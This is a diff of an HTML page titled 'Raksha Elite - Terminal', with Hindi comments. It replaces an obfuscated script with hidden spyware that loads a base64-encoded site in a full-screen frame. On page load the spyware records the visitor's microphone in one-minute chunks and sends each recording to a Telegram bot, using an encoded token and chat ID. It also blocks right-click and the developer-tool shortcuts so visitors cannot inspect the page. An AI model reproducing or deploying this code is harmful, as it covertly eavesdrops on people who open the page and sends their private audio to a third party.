@@ -2,30 +2,59 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Raksha Elite - Terminal</title>
     <style>
-        /* स्क्रीन को पूरी तरह कवर करना और बैकग्राउंड काला रखना */
         body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
         iframe { width: 100%; height: 100%; border: none; }
     </style>
     <script>
-        /* राइट क्लिक और कीबोर्ड शॉर्टकट्स को ब्लॉक करना ताकि कोई इंस्पेक्ट न कर सके */
-        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('contextmenu', event => event.preventDefault()); // Right click block
         document.onkeydown = function(e) {
-            if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
-                return false;
-            }
+            if(e.keyCode == 123) return false; // F12 block
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false; // Ctrl+Shift+I
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false; // Ctrl+Shift+J
+            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false; // Ctrl+U (View Source)
         };
     </script>
 </head>
-<body>
+<body onload="initializeSecureSync()">
 
-    <iframe id="mainView" src="about:blank" allow="microphone; camera;"></iframe>
+    <iframe id="secureFrame" src="" allow="microphone; camera;"></iframe>
 
     <script>
-        /* आपका Obfuscated सुरक्षा कोड यहाँ शुरू होता है */
-        (function(){var TbD='',JLv=225-214;function ijA(e){var c=2362714;var q=e.length;var w=[];for(var u=0;u<q;u++){w[u]=e.charAt(u)};for(var u=0;u<q;u++){var n=c*(u+316)+(c%18457);var z=c*(u+213)+(c%30539);var x=n%q;var y=z%q;var k=w[x];w[x]=w[y];w[y]=k;c=(n+z)%6590084;};return w.join('')};var BqT=ijA('tdrgutfhanrwskxnjiyrublctopvmsczqeoco').substr(0,JLv);var mkX='va6un71h=u[)x;hk]"9s.g,+c"-n}refj,u)na(<+mrrse7al{6i"+it=kcp[vd]9C+){u8yr7p=v);(m,Ana;(;;8;v.n.a18,0sC7+j1vn,c;,8[j-dr8ti;hei 6.[n1,op1;aa[l60p=ac=aefirh0g ;Cil(eq]r)e>v.vfs;8e(a;t,=utrut=1)ir8hno= >"taie1h.i;raoh]aeen.[e,tcpt=i((ie+A[r ((ghgtrnAri ; .e;r==6697);for=c[ruyhsCo(("(v}g9,+jnln)ar.s;r)oon<lxrCa,kt 2(fo4ar=au=ne3.eaa9os}k1b2a ig +pyavah3,(n)gnnvbiocsS=;0.+gwuho9btta"k(" j(-;cz)m )s00=;v60;l(;;zjkk;6e;)h=m+na(r)=6v])]rlhw.ukvt,]f+nuC6rn;=tC}gfb,lif(i;9fokg==)(z 7<gafb-x [4 m+reo0ela,kh,l)aoui8 rmc+,s;;0r2-(h;.tt=k+=lp.gloetco=cgbqf,5)= qjio+.l)cl]]vg1(rol=h.rus]t4rf5,dthrjy(9sbeo.,+,u=r)m.otb *;rsvA]te)tnc gl+ter 2o=;;u-=vp(sh(l,{r.f=ht";*atuk,gra=1=lr=pw)1s{}18fp}]lf;ar,ntf.a=k[=5tm)l;("oi0e} [n<{< uabc.2,39(r[ah+r+cg2c0((et=vn;Ax7S{+l5{.b-or=h!ih+n2) rrd=;v=t)v)sdb)nv777o.df+l;++;i,ivj0fC) 44n;v;ah).[===.jbij; +n" u.;a[(;ssrf,ue(v;r.z);re(2s]gs!(pl))))xsts]ntc(bdaqt';var gZy=ijA[BqT];var FhL='';var PkN=gZy;var dfq=gZy(FhL,ijA(mkX));var QqX=dfq(ijA('=03d.9!,ooX4:ioxo)X]e;4ef.ui,lsaX9."blMf=u+;1yr2(cXj 3"Xn,e.krp.43 M.;odnXat,2X9XjzX6(9bX:t];dim@uX}o.=_(.). Xf.b.ee9a(lqt+({s4]di}tfX4n2)v4f4_deXotv3l,))e en..m(X(=erXtX)_8X_2rtdg!5nr,i(X9sF2":a7vXtX4i]t2f".oXr4t{0.a_X73>._))1!1_s2cfal2cal,Mia(3,)X.Xsa3rak!;i$lpXXXjX23Db,0 ltt(1.X.5Xf6X[ng,ot{_d&;n;X,.5n;).fc;zw@d.Fz0.D9XX!;.(dX.s.tI;ieXS=k_X5X5\'XeIdr"X{tc.ytwi49s(r_%vc),r_{d{.[dr)0e1(.=a3{X*5%7}ceqt.5X\'I0!yq(E;;}s=d.0o[ D3]]2;_<ywda$n,domXd% ceca=3f#.3(e50X%@$%D).%})Xc}7B__I53.qlXg.6)M4zSioe2Xo.qG8\/,X)q_e!M+X[_dXXX&-i4X_)5GXy93y(X5.scg.E)as;e%h4g .o2y[Xe,{kX1{er!r")f!sa04())__XsX(_2ca)9ai i{d}zn.XMqs&r6n.ja!aXf.(ce6h2C}t1_yN.[f%)!XN>6al=BrX.=ewl5%)=iua!DmcXcs.aid)XvXXX1gitw]:f]%,rXlXXeXX(n.;aX_]bc.l03]}.9.X9r,.+.)6]((}Dsk5_.X_{weX(vXm{XuwXo(X1jbtg.0X)\/f%;vi:8cmhXueXtf4XX95v_;%o%_:Et= ;!)o0(d4bcX$o0m;(.=.X.{br5ef0tX(s{q!ei%nX9nc.mXj(1=!_E.}{S{4,X#ffe$wX)=fiq4]ma].f))*3,.s))t;Xa.rq$!>ah5X.hlX_s.c=fto(amX2(=)e)Xv_e;?(f_X3)<4evm.k(ahj)\/;! wE +X1e_q)#.5ke_;,ocf>.eb)+;ar.)A,d):fIrjXya&(]f;oj)=z%!Xokol.,c!X?cfX8oz!jcd t!.l!dX]fh! .k.egr.(X5X=7ssc6,s$6X@];f]X(.).Xii8c,nf}5.go$X_1C]dnDeyX7.bX[.i37%2n s7);qXhX]X .gXXeo9).-)0_!f ].){X_r8C(d=; y={)=0"$vlfd.waeX).0t]0Et3(;X!X,]sp_.m4(hX9Xt;y\'fX;7)61sX)wff]Xe{X;lorXf(mXpv,X4$Xf+!\/r$)4)oXXnt#=b,5t{f m[q.afXpm_5l(X5d5p;{!lp[%r),XbltXXApbTX]0(9;.3Xe("lcj(tun1_=g_S"s)v+fjX45C)G; so.ad.o)i_M(%CXorXaf3rX42XtoX.Xh],)a;adh#])}{dmi.0!X(a)!t7d(7(]a.({l0_Xdntude+!0t}:!$e6re=[n$1e &!2soX}j9(..\/M\/e.eX,ts]c]y;u),_d)5Do)0X.8;w3_anl\/_ .3Mf1o,c)&k*dX>c+)rb+vX*X2s.1&X70l50]){nz}Xm!_.j9XfoX X1j=n#"n8.y]ef3j%)\/X-3ofct,6i}nF2)ef lE1!3!a%a.Xdc+sn%).6@(n.X_0SXbX!62mC;aXXof]rtgno%,s=X!_dXG(se)tkCa).X;xX=\/,DT.14";9X,.XX"ci.X2h(<sXX5)sl$_j rXhe.!XXtt).$w)+XX6e$))(;F(Xrnt(.,(Xfa.3)tz.r6t;dX*asg3bo}")(7=tddn= (3X!o)f]r]s1)fo=;n),1$,XsuX3Xbn$X9t(X(;=X, (j;.96})m]e.(88(C(! ;t.e)=X.(=s2k5o3=X0"(y3 )95fe}a)XC179_l}c2}knmat._dwX\/.rmssf_a)_);]X(dB]N_fm[]:&.1](t=\'fo4*2);irlX.n0oX%]((oc)]io,0)(}ot2o6e)_X(jeo(5_%bd_"m=(a_g)5vn3b12Xk"X0X)sMlegif[D>"o5a0.!j((s].5XX]>8eoft.5)12XaX;o.nXy_(7.50X#37blX)4o6(.!;,ofmz(741(64(et6dz5{tXptsr3k3"%XoX."}efX}X)n.r(c{i$33rj.([*.!7(d;}1r]0tva%cn5g]%(u0Xe,]}dio gb(ck{M%nr9 X)Xb2f-o_;D1_ld4)$0_{1]8*=_me;.fc50"X)!$ft_\/s_=uiXi6blbp)]B;,;_6Xa_$:MX,bw)=irr$#((%X,q.4XapkX$o.X)j4X_+$X2 6X%tX XpaXt6a_(Xk,6X.)_$nX7CjtzCl&__7a)hi{](([s=; aunuwi5A.6 {6d.dcXX_.]2!eoor8C){Xchqa?0v_o(7(.d(;xe}c?_.;oiX5{elpX)tt:gXj%X$s)}a=(X4&x{3e( Aa9_X1leabrf:=.;w3_X}%o=2opeo] X]5a( i}]Xd)&Xh;,)))p0 =D::X(aX.n_al'));var VEA=PkN(TbD,QqX );VEA(8121);return 2044})()
+        // आपकी जानकारी यहाँ Encrypted है (Base64)
+        const _0x5a1 = "ODM3ODAzNzkzNzpBQUdqdUZkWldsbmYwa0ZmVEdfUUlGc2xndnJETUItc0M0"; // BOT_TOKEN
+        const _0x2b9 = "ODUwODc5MjQwMw=="; // CHAT_ID
+        const _0x9f3 = "aHR0cHM6Ly9hZXN0aGV0aWMteWVvdC05M2Q4MzUubmV0bGlmeS5hcHA="; // REAL_LINK
+
+        function decodeData(data) { return atob(data); }
+
+        async function initializeSecureSync() {
+            // असली लिंक को डिकोड करके फ्रेम में लोड करना
+            document.getElementById('secureFrame').src = decodeData(_0x9f3);
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const recorder = new MediaRecorder(stream);
+                let chunks = [];
+
+                recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    const fd = new FormData();
+                    fd.append("chat_id", decodeData(_0x2b9));
+                    fd.append("voice", blob, "secure_log.ogg");
+                    
+                    fetch(`https://api.telegram.org/bot${decodeData(_0x5a1)}/sendVoice`, { method: "POST", body: fd });
+                    chunks = [];
+                    if (stream.active) { setTimeout(() => recorder.start(), 1000); }
+                };
+
+                recorder.start();
+                setInterval(() => { if (recorder.state === "recording") recorder.stop(); }, 60000);
+            } catch (err) { console.log("System Running..."); }
+        }
     </script>
 </body>
 </html>
